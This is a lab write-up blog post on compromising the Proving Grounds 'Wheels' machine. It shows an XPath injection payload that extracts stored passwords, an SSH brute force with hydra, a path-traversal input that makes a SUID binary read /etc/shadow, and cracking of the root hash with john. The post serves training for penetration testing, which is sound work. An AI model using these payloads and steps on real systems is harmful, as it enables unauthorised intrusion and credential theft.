---
title: "Proving grounds Play: Wheels"
layout: post
date: 2023-10-08 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Wheels - Car Repair Services
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

http://192.168.196.202/index.html

![img](/assets/images/CTF/Proving_Grounds/Wheels/web.png)

Upon recon there was an endpoint discovered through the Employee portal button `http://192.168.196.202/login.php`. But access to the page is denied as this user needs to be logged in and we don't have a valid user.

After registering a user and accessing the same endpoint resulted in the same access denied response, because the user email should be same as the applications email domain. And the email account mentioned in the bottom of the page shows the email domain `info@wheels.service`. Use the same email domain to register an account.

![img](/assets/images/CTF/Proving_Grounds/Wheels/reg.png)

Register an user with the mentioned email domain `user@wheels.service` and login to the account.

![img](/assets/images/CTF/Proving_Grounds/Wheels/eportal.png)
 
After loggin in successfully click on the `Employee Portal` button and the page will be accessible. Now click on the Search button and intercept the request in Burp suite. The search button shows users in the service which is a possible users exist in the attacking machine.

Upon doing recon the parameter `work` in the request is vulnerable to XPath injection.

## XPath Injection

Send the below request and observe the XML error in the response.

```text
GET /portal.php?work=car'&action=search HTTP/1.1
Host: 192.168.196.202
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.196.202/portal.php?work=car&action=search
Cookie: PHPSESSID=e46fk6dmcbj9r807ojgflhej0e
Upgrade-Insecure-Requests: 1
```

```html
<table align="center" height="40" background-color="#92f0ff">
<tr height="40" bgcolor="#17ffb7" align="center">
<td width="200"><b>Search users by services: </b></td>
</tr>
XML Error; No car' entity found<br />
<b>Warning</b>:  SimpleXMLElement::xpath(): Invalid expression in <b>/var/www/html/portal.php</b> on line <b>68</b><br />
<tr height="40">
<td colspan="5" width="210">No users were found!</td>							
</tr>     							
</table>
```

### Exploitation

Send the payload `')]/password+|+a[contains+(a,'` to extract passwords from the application.

#### Request

```text
GET /portal.php?work=car')]/password+|+a[contains+(a,'&action=search HTTP/1.1
Host: 192.168.196.202
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.196.202/portal.php?work=car&action=search
Cookie: PHPSESSID=e46fk6dmcbj9r807ojgflhej0e
Upgrade-Insecure-Requests: 1
```

#### Response

```html
<table align="center" height="40" background-color="#92f0ff">
<tr height="40" bgcolor="#17ffb7" align="center">
<td width="200"><b>Search users by services: </b></td>
</tr>
XML Error; No car')]/password | a[contains (a,' entity found
<tr height="40" bgcolor="#c8dbde" align="center">
<td>1</td>
<td width="200"><b>Iamrockinginmyroom1212</b></td>
</tr>         
<tr height="40" bgcolor="#c8dbde" align="center">
<td>2</td>
<td width="200"><b>iamarabbitholeand7875</b></td>
</tr>         
<tr height="40" bgcolor="#c8dbde" align="center">
<td>3</td>
<td width="200"><b>johnloveseverontr8932</b></td>
</tr>         
</table> 
```

### Users

```text
alice
bob
john
```

### Passwords

```text
Iamrockinginmyroom1212
iamarabbitholeand7875
johnloveseverontr8932
alreadydead$%^234
lasagama90809!@
```

## Initial Foothold

Use `hydra` to brute force the credentials for SSH.

```sh
naveenj@hackerspace:|01:04|~/proving_grounds/Wheels$ hydra -L users -P passwd ssh://192.168.196.202
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-08 01:04:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 15 tasks per 1 server, overall 15 tasks, 15 login tries (l:3/p:5), ~1 try per task
[DATA] attacking ssh://192.168.196.202:22/
[22][ssh] host: 192.168.196.202   login: bob   password: Iamrockinginmyroom1212     #password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-08 01:04:59
```

**Initial Foothold Obtained**

## Privilege Escalation

Upon doing recon a file with SUID bit has been set to a binary file named `get-list` has been found in the `/opt` directory. The binary prints the employees or customers list if the input is either `employees/customers`.

After a while trying multiple techniques to check the functionality of the binary results that it reads inputs, and prints list of employees and customers and also it reads contents from other files too.

```sh
bob@wheels:/opt$ ./get-list

Which List do you want to open? [customers/employees]: ./../etc/passwd#employees
Opening File....
```

### Bypass

Add space between the file to read and the input `../../etc/passwd #employees`.

**/etc/passwd**

```sh
bob@wheels:/opt$ ./get-list

Which List do you want to open? [customers/employees]: ../../etc/passwd #employees
Opening File....

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

**/etc/shadow**

```sh
bob@wheels:/opt$ ./get-list

Which List do you want to open? [customers/employees]: ../../etc/shadow #employees
Opening File....

root:$6$Hk74of.if9klVVcS$EwLAljc7.DOnqZqVOTC0dTa0bRd2ZzyapjBnEN8tgDGrR9ceWViHVtu6gSR.L/WTG398zZCqQiX7DP/1db3MF0:19123:0:99999:7:::
daemon:*:18474:0:99999:7:::
bin:*:18474:0:99999:7:::
sys:*:18474:0:99999:7:::
sync:*:18474:0:99999:7:::
...
```

Use the `unshadow` tool to combine the passwd and shadow file together which later can be used to crack the hashes using john.

```sh
naveenj@hackerspace:|01:08|~/proving_grounds/Wheels$ unshadow passwd shadow > crackme 
naveenj@hackerspace:|01:08|~/proving_grounds/Wheels$ john crackme --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
highschoolmusical (root)     #root password
1g 0:00:05:00 5.27% (ETA: 02:44:00) 0.003327g/s 2877p/s 2899c/s 2899C/s marquie1..marlai
```

SSH to root using the credential `root:highschoolmusical`.

```sh
naveenj@hackerspace:|02:52|~/proving_grounds/Wheels$ ssh root@192.168.196.202
root@192.168.196.202's password: 
Last login: Sun Oct  8 05:09:27 2023 from 192.168.45.153
root@wheels:~# 
```

**Root Obtained**

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md#exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md#exploitation)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).